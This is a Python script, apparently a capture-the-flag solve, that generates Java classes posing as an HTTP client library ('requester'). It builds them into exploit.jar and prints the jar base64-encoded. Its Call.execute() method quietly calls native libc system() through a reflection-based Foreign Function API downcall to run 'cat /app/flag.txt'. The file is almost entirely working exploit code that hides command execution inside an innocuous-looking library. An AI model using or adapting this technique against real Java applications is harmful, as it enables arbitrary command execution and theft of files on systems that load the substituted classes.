#!/usr/bin/env python3
import base64
import pathlib
import shutil
import subprocess
import tempfile
import textwrap
import zlib


SOURCES = {
    "requester/ProxyAuthenticator.java": """
        package requester;

        public interface ProxyAuthenticator {
            void authenticate(Request request);
        }
    """,
    "requester/Request.java": """
        package requester;

        public class Request {
            public String url;

            public static class Builder {
                private final Request request = new Request();

                public Builder url(String url) {
                    request.url = url;
                    return this;
                }

                public Request build() {
                    return request;
                }
            }
        }
    """,
    "requester/Response.java": """
        package requester;

        public class Response {
            public int code() {
                return 200;
            }

            public String body() {
                return "ok";
            }

            public void close() {
            }
        }
    """,
    "requester/Call.java": """
        package requester;

        public class Call {
            public Response execute() {
                FFM.catFlag();
                return new Response();
            }
        }
    """,
    "requester/HttpClient.java": """
        package requester;

        import java.net.Proxy;

        public class HttpClient {
            public Builder newBuilder() {
                return new Builder();
            }

            public Call newCall(Request request) {
                return new Call();
            }

            public static class Builder {
                private final HttpClient client = new HttpClient();

                public Builder proxy(Proxy proxy) {
                    return this;
                }

                public Builder proxyAuthenticator(ProxyAuthenticator auth) {
                    return this;
                }

                public HttpClient build() {
                    return client;
                }
            }
        }
    """,
    "requester/FFM.java": """
        package requester;

        import java.lang.invoke.MethodHandle;
        import java.lang.reflect.Array;
        import java.util.Optional;

        public class FFM {
            public static void catFlag() {
                try {
                    Class<?> linkerClass = Class.forName("java.lang.foreign.Linker");
                    Class<?> symbolLookupClass = Class.forName("java.lang.foreign.SymbolLookup");
                    Class<?> memorySegmentClass = Class.forName("java.lang.foreign.MemorySegment");
                    Class<?> functionDescriptorClass = Class.forName("java.lang.foreign.FunctionDescriptor");
                    Class<?> memoryLayoutClass = Class.forName("java.lang.foreign.MemoryLayout");
                    Class<?> valueLayoutClass = Class.forName("java.lang.foreign.ValueLayout");
                    Class<?> arenaClass = Class.forName("java.lang.foreign.Arena");
                    Class<?> optionClass = Class.forName("java.lang.foreign.Linker$Option");

                    Object linker = linkerClass.getMethod("nativeLinker").invoke(null);
                    Object lookup = linkerClass.getMethod("defaultLookup").invoke(linker);
                    Optional<?> systemSymbol = (Optional<?>) symbolLookupClass
                            .getMethod("find", String.class)
                            .invoke(lookup, "system");
                    Object systemAddress = systemSymbol.orElseThrow();

                    Object javaInt = valueLayoutClass.getField("JAVA_INT").get(null);
                    Object address = valueLayoutClass.getField("ADDRESS").get(null);
                    Object argumentLayouts = Array.newInstance(memoryLayoutClass, 1);
                    Array.set(argumentLayouts, 0, address);
                    Object descriptor = functionDescriptorClass
                            .getMethod("of", memoryLayoutClass, argumentLayouts.getClass())
                            .invoke(null, javaInt, argumentLayouts);

                    Object options = Array.newInstance(optionClass, 0);
                    MethodHandle system = (MethodHandle) linkerClass
                            .getMethod("downcallHandle", memorySegmentClass,
                                    functionDescriptorClass, options.getClass())
                            .invoke(linker, systemAddress, descriptor, options);

                    Object arena = arenaClass.getMethod("ofAuto").invoke(null);
                    String command = "cat /app/flag.txt";
                    Object cString = arenaClass
                            .getMethod("allocate", long.class, long.class)
                            .invoke(arena, command.length() + 1L, 1L);
                    memorySegmentClass
                            .getMethod("setUtf8String", long.class, String.class)
                            .invoke(cString, 0L, command);

                    system.invokeWithArguments(cString);
                } catch (Throwable t) {
                    System.out.println("FFM_FAIL=" + t.getClass().getName() + ":" + t.getMessage());
                }
            }
        }
    """,
}


def main() -> None:
    workdir = pathlib.Path(tempfile.mkdtemp(prefix="snaking-solve-"))
    try:
        src = workdir / "src"
        classes = workdir / "classes"
        jar = workdir / "exploit.jar"
        classes.mkdir()

        for relpath, source in SOURCES.items():
            path = src / relpath
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(textwrap.dedent(source).strip() + "\n")

        java_sources = sorted(str(path) for path in src.rglob("*.java"))
        subprocess.run(["javac", "--release", "17", "-d", str(classes), *java_sources], check=True)
        subprocess.run(["jar", "cf", str(jar), "-C", str(classes), "."], check=True)

        print(base64.b64encode(zlib.compress(jar.read_bytes())).decode())
    finally:
        shutil.rmtree(workdir)


if __name__ == "__main__":
    main()
